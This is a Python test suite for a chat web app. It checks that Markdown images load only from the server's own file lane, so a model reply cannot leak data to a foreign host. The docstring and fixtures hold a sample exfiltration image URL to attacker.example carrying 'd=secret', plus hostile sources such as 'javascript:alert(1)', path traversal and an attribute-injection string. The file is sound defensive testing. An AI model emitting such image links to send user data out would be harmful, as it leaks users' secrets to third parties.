# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""Images in Markdown load only from this server's file lane (web/lib/markdownImages.ts,
web/components/Markdown.tsx).

A reply holding `![p](https://attacker.example/x.png?d=secret)` used to render an `<img>` with
that address, so the browser of whoever looked at the bubble sent the address, and whatever the
model put into it, to a foreign host. The same held for the Code Viewer's Markdown preview, the
model card preview, attached Markdown documents and the Document Editor's Markdown frame. Now an
image loads only from `/api/file`; a web image is a link marked with an image icon, anything else
its alt text, and the two frames that show Markdown carry a policy that blocks every other image
source, raw HTML included.

The renderers are the web's REAL code, transpiled with the app's own TypeScript and run in node
with react-markdown, remark-gfm and marked from web/node_modules (the pattern of
tests/test_tool_card_i18n_web.py); `ChatMarkdown` and `MarkdownPreview` are cut out of their
files as they stand. Skipped without node or web/node_modules.

MUTATIONS, each turns the named test red:
- drop `rehypeOwnImagesOnly` from the wrapper's `rehypePlugins`
  -> test_a_remote_image_in_a_bubble_is_a_link_not_an_image, test_an_image_without_alt_is_labelled_with_its_address,
     test_the_preview_and_the_model_card_follow_the_same_rule;
- drop the `insideLink` branch in `rewriteImages` (an image in a link then becomes a nested link)
  -> test_an_image_inside_a_link_is_the_links_text;
- make `ownImageSrc` skip the `normalizeDownloadHref` candidate
  -> test_own_images_load_from_the_file_lane, test_the_decision_over_hostile_and_own_sources;
- compare the origin only (drop `url.pathname === OWN_FILE_LANE`)
  -> test_the_decision_over_hostile_and_own_sources;
- drop the `walkTokens` hook of the document renderer
  -> test_an_attached_markdown_document_shows_remote_images_as_links;
- `marked.use(...)` on the shared instance instead of `new Marked(...)`
  -> test_an_attached_markdown_document_shows_remote_images_as_links (the editor's output changes);
- remove `${markdownFrameHead()}` from one DocumentViewer builder, or `${framePolicy}` from the
  editor's frame write -> test_both_markdown_frames_carry_the_policy_first;
- `img-src 'self'` or a trailing slash on the lane in `markdownFramePolicy`
  -> test_the_frame_policy_allows_only_the_file_lane;
- `import ReactMarkdown from 'react-markdown'` back in CodeViewer.tsx, or `import('marked')` back
  in DocumentEditor.tsx -> test_one_importer_per_markdown_library;
- the editor calling `renderMarkdownDocument` -> test_the_editor_keeps_the_files_markup;
- a local `normalizeDownloadHref` back in page.tsx, or `renderMarkdownLinks` back
  -> test_the_chat_uses_the_wrapper_and_the_moved_link_rule;
- render a picture link without its icon (`if (true) return <Anchor ...>` in the wrapper)
  -> test_a_remote_image_in_a_bubble_is_a_link_not_an_image;
- try the http base first (`//host/x` then reads as http)
  -> test_a_remote_image_in_a_bubble_is_a_link_not_an_image.

The frame policy itself was measured once in headless Chromium (the frames' sandbox flags, a
policy built by `markdownFramePolicy`): remote `img`, `srcset`, `video poster`, `iframe`, CSS
`url()`, `/api/file/x` and any other path of the server fetched nothing, `/api/file?path=...`
loaded. The suite has no browser, so these tests pin the policy's text and its place.
"""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
WEB = ROOT / "web"
LIB = WEB / "lib" / "markdownImages.ts"
WRAPPER = WEB / "components" / "Markdown.tsx"
PAGE = WEB / "app" / "page.tsx"
CODE_VIEWER = WEB / "components" / "CodeViewer.tsx"
SETTINGS = WEB / "components" / "SettingsModal.tsx"
DOC_VIEWER = WEB / "components" / "DocumentViewer.tsx"
DOC_EDITOR = WEB / "components" / "DocumentEditor.tsx"


def _source(path):
    # hostile_env checks the tree out with CRLF line ends.
    return path.read_bytes().decode("utf-8").replace("\r\n", "\n")


def _slice(path, start, end):
    text = _source(path)
    i = text.index(start)
    return text[i:text.index(end, i)]


_SCRIPT = r"""
const path = require('path'), fs = require('fs');
const W = process.argv[1];
const req = require('module').createRequire(path.join(W, 'package.json'));
const ts = req('typescript'), React = req('react');
const { renderToStaticMarkup } = req('react-dom/server');
const [files, ops] = JSON.parse(fs.readFileSync(0, 'utf8'));
function load(src, stubs) {
  const js = ts.transpileModule(src, {compilerOptions: {module: ts.ModuleKind.CommonJS,
    jsx: ts.JsxEmit.React, target: ts.ScriptTarget.ES2019, esModuleInterop: true}}).outputText;
  const m = {exports: {}};
  new Function('require', 'module', 'exports', js)((id) => (id in stubs ? stubs[id] : req(id)), m, m.exports);
  return m.exports;
}
const stubs = {
  '@/lib/utils': {cn: (...a) => a.filter(Boolean).join(' '), getApiBase: () => ''},
  'lucide-react': new Proxy({}, {get: (_, name) => (name === '__esModule' ? undefined
    : (props) => React.createElement('svg', {'data-icon': String(name), 'aria-hidden': props['aria-hidden']}))}),
};
stubs['@/lib/markdownImages'] = load(files.lib, stubs);
stubs['@/components/Markdown'] = load(files.wrapper, stubs);
const lib = stubs['@/lib/markdownImages'];
const { Markdown } = stubs['@/components/Markdown'];
const chat = load(files.chat, stubs);
const preview = load(files.preview, stubs);
(async () => {
  const out = [];
  for (const [op, arg, extra] of ops) {
    if (op === 'markdown') out.push(renderToStaticMarkup(React.createElement(Markdown, null, arg)));
    else if (op === 'chat') out.push(renderToStaticMarkup(React.createElement(chat.ChatMarkdown, {dark: !!extra}, arg)));
    else if (op === 'preview') out.push(renderToStaticMarkup(React.createElement(preview.MarkdownPreview, {source: arg})));
    else if (op === 'own') out.push(lib.ownImageSrc(arg));
    else if (op === 'link') out.push(lib.imageLinkHref(arg));
    else if (op === 'normalize') out.push(lib.normalizeDownloadHref(arg));
    else if (op === 'doc') out.push(lib.renderMarkdownDocument(arg));
    else if (op === 'editor') out.push(await lib.renderMarkdownForEditor(arg));
    else if (op === 'global') out.push(req('marked').marked.parse(arg, {gfm: true, breaks: false}));
    else if (op === 'policy') out.push(lib.markdownFramePolicy(arg));
    else throw new Error('unknown op ' + op);
  }
  process.stdout.write(JSON.stringify(out));
})().catch((e) => { console.error(e); process.exit(1); });
"""


def _run(ops):
    if shutil.which("node") is None:
        pytest.skip("node is not installed")
    for pkg in ("react-markdown", "remark-gfm", "marked", "typescript", "react-dom"):
        if not (WEB / "node_modules" / pkg).is_dir():
            pytest.skip(f"web/node_modules/{pkg} is not installed")
    chat = ("import React from 'react';\n"
            "import { Markdown } from '@/components/Markdown';\n"
            "import { normalizeDownloadHref } from '@/lib/markdownImages';\n"
            + _slice(PAGE, "/** Renders markdown in chat bubbles", "// Component: Thinking Accordion")
            + "\nexport { ChatMarkdown };\n")
    preview = ("import React from 'react';\n"
               "import { Markdown } from '@/components/Markdown';\n"
               + _slice(CODE_VIEWER, "function MarkdownPreview", "// ── Language detection")
               + "\nexport { MarkdownPreview };\n")
    files = {"lib": _source(LIB), "wrapper": _source(WRAPPER), "chat": chat, "preview": preview}
    out = subprocess.run(["node", "-e", _SCRIPT, str(WEB)], input=json.dumps([files, ops]),
                         capture_output=True, text=True, encoding="utf-8")
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


def _anchors(html):
    return re.findall(r"<a\b[^>]*>", html)


SECRET = "https://attacker.example/x.png?d=secret"
REMOTE_FORMS = [
    ("inline", f"![p]({SECRET})", SECRET),
    ("reference", "![p][r]\n\n[r]: https://ref.example/z.png", "https://ref.example/z.png"),
    ("protocol-relative", "![p](//proto.example/rel.png)", "https://proto.example/rel.png"),
    ("scheme-relative", "![p](https:host.example/x.png)", "https://host.example/x.png"),
    ("own server by host", "![p](http://localhost:3000/api/file?path=a)", "http://localhost:3000/api/file?path=a"),
]


@pytest.mark.parametrize("dark", [False, True], ids=["bot", "user"])
def test_a_remote_image_in_a_bubble_is_a_link_not_an_image(dark):
    outs = _run([["chat", md, dark] for _, md, _ in REMOTE_FORMS])
    for (form, _, url), html in zip(REMOTE_FORMS, outs):
        assert "<img" not in html, f"{form}: the bubble still loads the image: {html}"
        anchors = _anchors(html)
        assert len(anchors) == 1, f"{form}: {html}"
        href = url.replace("&", "&amp;")
        assert f'href="{href}"' in anchors[0], f"{form}: {html}"
        assert 'target="_blank"' in anchors[0] and 'rel="noopener noreferrer"' in anchors[0], html
        assert f'<span title="{href}"' in html, f"{form}: no hover address: {html}"
        assert 'data-icon="Image"' in html, f"{form}: no image icon: {html}"
        assert re.sub(r"<[^>]+>", "", html).strip() == "p", f"{form}: label is not the alt text: {html}"


def test_an_image_without_alt_is_labelled_with_its_address():
    [html] = _run([["chat", "![](https://a.example/y.png)", False]])
    assert "<img" not in html
    assert re.sub(r"<[^>]+>", "", html).strip() == "https://a.example/y.png"


def test_an_image_inside_a_link_is_the_links_text():
    [html, own] = _run([
        ["chat", "[![b](https://badge.example/b.svg)](https://x.example)", False],
        ["chat", "[![b](/api/file?path=b.png)](https://x.example)", False],
    ])
    assert "<img" not in html, html
    anchors = _anchors(html)
    assert len(anchors) == 1 and 'href="https://x.example"' in anchors[0], html
    assert re.sub(r"<[^>]+>", "", html).strip() == "b", html
    # An own picture inside a link stays a picture.
    assert '<img src="/api/file?path=b.png"' in own or 'src="/api/file?path=b.png"' in own, own


OWN_FORMS = [
    ("![c](/api/file?path=out%2Fc.png)", "/api/file?path=out%2Fc.png"),
    ("![c](sandbox:/out/c.png)", "/api/file?path=out%2Fc.png"),
    ("![c](/home/user/c.png)", "/api/file?path=%2Fhome%2Fuser%2Fc.png"),
]


def test_own_images_load_from_the_file_lane():
    outs = _run([["chat", md, False] for md, _ in OWN_FORMS])
    for (md, src), html in zip(OWN_FORMS, outs):
        imgs = re.findall(r"<img\b[^>]*>", html)
        assert len(imgs) == 1, f"{md}: {html}"
        assert f'src="{src}"' in imgs[0], f"{md}: {html}"
        assert 'class="max-w-full h-auto rounded my-2"' in imgs[0] and 'alt="c"' in imgs[0], html
        assert "<a" not in html, html


HOSTILE = [
    "/api/config", "/api/files", "https://attacker.example/x.png", "//host.example/x",
    "/\\host.example/x", "https:host.example/x", "http://localhost:3000/api/file?path=a",
    "data:image/png;base64,AAAA", "blob:http://localhost:3000/abc", "javascript:alert(1)",
    "", "   ", "relative/pic.png", "ftp://host.example/x.png",
]


def test_the_decision_over_hostile_and_own_sources():
    srcs = HOSTILE + ["/api/file/../config", "/api/file?path=a.png#frag", "api/file?path=a", "C:\\Users\\a\\c.png",
                      "sandbox:/a b.png", "/home/user/c.png"]
    outs = _run([["own", s] for s in srcs])
    got = dict(zip(srcs, outs))
    for s in HOSTILE:
        if s.startswith("/") and not s.startswith(("//", "/\\")):
            # A host path is a file the links already send to the file lane; never the path itself.
            assert got[s] == "/api/file?path=" + _quote(s), (s, got[s])
        else:
            assert got[s] is None, (s, got[s])
    assert got["/api/file/../config"] == "/api/file?path=%2Fapi%2Ffile%2F..%2Fconfig"
    assert got["/api/file?path=a.png#frag"] == "/api/file?path=a.png"
    # Relative to any page of the UI this is the file lane itself; it is returned absolute.
    assert got["api/file?path=a"] == "/api/file?path=a"
    assert got["C:\\Users\\a\\c.png"] == "/api/file?path=C%3A%5CUsers%5Ca%5Cc.png"
    assert got["sandbox:/a b.png"] == "/api/file?path=a%20b.png"
    assert got["/home/user/c.png"] == "/api/file?path=%2Fhome%2Fuser%2Fc.png"
    for s, value in got.items():
        assert value is None or value.startswith("/api/file?"), (s, value)


def _quote(s):
    from urllib.parse import quote
    return quote(s, safe="~()*!.'")


def test_the_preview_and_the_model_card_follow_the_same_rule():
    md = f"![p]({SECRET})\n\n![c](sandbox:/out/c.png)\n\n[docs](https://docs.example)"
    preview, card = _run([["preview", md], ["markdown", md]])
    for name, html in (("code viewer preview", preview), ("model card", card)):
        imgs = re.findall(r"<img\b[^>]*>", html)
        assert len(imgs) == 1 and 'src="/api/file?path=out%2Fc.png"' in imgs[0], f"{name}: {html}"
        assert SECRET.replace("&", "&amp;") in html and 'data-icon="Image"' in html, f"{name}: {html}"
        for a in _anchors(html):
            assert 'target="_blank"' in a and 'rel="noopener noreferrer"' in a, f"{name}: {a}"
    # The preview keeps its own picture style.
    assert 'class="max-w-full rounded my-3"' in preview, preview
    assert "<Markdown>{modelPreviewData.card_content}</Markdown>" in _source(SETTINGS)


def test_an_attached_markdown_document_shows_remote_images_as_links():
    md = (f"![p]({SECRET})\n\n![c](/api/file?path=c.png)\n\n"
          "[![b](https://badge.example/b.svg)](https://x.example)\n\n![](https://a.example/y.png)\n\n"
          "![d](data:image/png;base64,AAAA)")
    doc, editor, glob = _run([["doc", md], ["editor", md], ["global", md]])
    imgs = re.findall(r"<img\b[^>]*>", doc)
    assert imgs == ['<img src="/api/file?path=c.png" alt="c">'], doc
    assert (f'<a href="{SECRET.replace("&", "&amp;")}" target="_blank" rel="noopener noreferrer" '
            f'title="{SECRET.replace("&", "&amp;")}">p</a>') in doc, doc
    assert '<a href="https://x.example">b</a>' in doc, doc
    assert ">https://a.example/y.png</a>" in doc, doc
    assert "data:" not in doc, doc
    # The shared instance (the editor's) is untouched: it still writes every image as it stands.
    assert editor == glob
    assert f'<img src="{SECRET.replace("&", "&amp;")}" alt="p">' in editor, editor
    assert '<img src="https://badge.example/b.svg" alt="b">' in editor, editor


def test_the_frame_policy_allows_only_the_file_lane():
    good, empty, hostile = _run([["policy", "http://localhost:3000"], ["policy", ""],
                                 ["policy", 'http://x" onload="y']])
    assert good.startswith('<meta http-equiv="Content-Security-Policy" content="')
    content = good.split('content="', 1)[1].rsplit('"', 1)[0]
    directives = dict(d.strip().split(" ", 1) for d in content.split(";"))
    assert directives["default-src"] == "'none'"
    assert directives["img-src"] == "http://localhost:3000/api/file data: blob:"
    assert directives["media-src"] == "http://localhost:3000/api/file data: blob:"
    assert "'self'" not in content and "*" not in content
    for policy in (empty, hostile):
        inner = policy.split('content="', 1)[1].rsplit('"', 1)[0]
        assert "img-src data: blob:" in inner and "onload" not in policy, policy


def test_both_markdown_frames_carry_the_policy_first():
    viewer = _source(DOC_VIEWER)
    heads = re.findall(r"\(mdHtml \? `<!DOCTYPE html><html[^>]*><head>([^`]*?)</head><body>\$\{mdHtml\}", viewer)
    assert len(heads) == 2, "expected the dock and the overlay Markdown document"
    for head in heads:
        assert head.startswith("${markdownFrameHead()}"), head
    helper = _slice(DOC_VIEWER, "function markdownFrameHead()", "\n}\n")
    assert "markdownFramePolicy(" in helper and "window.location.origin" in helper
    assert viewer.count("renderMarkdownDocument(doc.content)") == 2

    editor = _source(DOC_EDITOR)
    write = re.search(r"doc\.write\(\s*`<!DOCTYPE html><html><head>([^`]*)</head><body></body></html>`", editor)
    assert write and write.group(1).startswith("${framePolicy}"), "the editor frame's head lost the policy"
    assert ("const framePolicy = isMarkdownPath(filePath) ? markdownFramePolicy(window.location.origin) : '';"
            in editor)


_IMPORT = re.compile(r"""(?:from\s+|import\s*\(\s*|require\s*\(\s*|import\s+)['"]({names})['"]""")


def test_one_importer_per_markdown_library():
    allowed = {"react-markdown": WRAPPER, "remark-gfm": WRAPPER, "marked": LIB}
    pattern = re.compile(_IMPORT.pattern.format(names="|".join(re.escape(n) for n in allowed)))
    found = {name: [] for name in allowed}
    for folder in ("app", "components", "lib", "hooks"):
        for path in sorted((WEB / folder).rglob("*")):
            if path.suffix not in (".ts", ".tsx") or path.name == "licenses_data.ts":
                continue
            for name in pattern.findall(_source(path)):
                found[name].append(path)
    for name, paths in found.items():
        assert paths == [allowed[name]], f"{name} is imported by {[str(p.relative_to(ROOT)) for p in paths]}"


def test_the_editor_keeps_the_files_markup():
    branch = _slice(DOC_EDITOR, "if (isMarkdownPath(filePath)) {\n                // Render Markdown", "savedContentRef.current = text;")
    assert "text = await renderMarkdownForEditor(text);" in branch
    assert "renderMarkdownDocument" not in _source(DOC_EDITOR)


def test_the_chat_uses_the_wrapper_and_the_moved_link_rule():
    page = _source(PAGE)
    chat = _slice(PAGE, "/** Renders markdown in chat bubbles", "// Component: Thinking Accordion")
    assert "<Markdown\n" in chat and "</Markdown>" in chat
    assert "import { normalizeDownloadHref } from '@/lib/markdownImages';" in page
    assert "const normalizeDownloadHref" not in page and "function normalizeDownloadHref" not in page
    assert "renderMarkdownLinks" not in page
    out = _run([["normalize", "sandbox:/a b"], ["normalize", "/home/user/r.pdf"],
                ["normalize", "C:\\x\\r.pdf"], ["normalize", "https://x.example/r"],
                ["chat", "[r](/home/user/r.pdf)", False]])
    assert out[:4] == ["/api/file?path=a%20b", "/api/file?path=%2Fhome%2Fuser%2Fr.pdf",
                       "/api/file?path=C%3A%5Cx%5Cr.pdf", "https://x.example/r"]
    assert 'href="/api/file?path=%2Fhome%2Fuser%2Fr.pdf"' in out[4] and "data-icon" not in out[4], out[4]
